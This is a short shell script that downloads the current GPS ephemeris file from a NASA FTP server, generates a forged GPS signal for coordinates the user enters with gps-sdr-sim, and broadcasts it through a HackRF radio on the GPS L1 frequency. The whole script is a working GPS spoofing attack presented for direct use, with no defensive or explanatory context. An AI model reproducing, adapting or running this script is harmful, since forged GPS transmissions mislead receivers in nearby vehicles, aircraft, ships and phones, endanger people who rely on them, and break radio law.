#!/bin/sh

#find and delete any previous files to avoid conflict
find -type f -name '*.19n' -delete
find -type f -name 'gpssim.bin' -delete

#get user input for coordinates
echo input coordinates without spaces

read varname

#download the ephemeris file containig satellite positions
day=$(date +%j)
year=$(date +%Y)
yr=$(date +%y)

wget "ftp://cddis.gsfc.nasa.gov/gnss/data/daily/$year""/brdc/brdc""$day""0.$yr""n.Z"

uncompress "brdc""$day""0.$yr""n.Z"

EPHE="brdc""$day""0.$yr""n"

#generate the signal file with the coordinates and ephemeris file
./gps-sdr-sim -b 8 -e $EPHE -l $varname,100

#spoof the signal using the hackrf
sudo hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
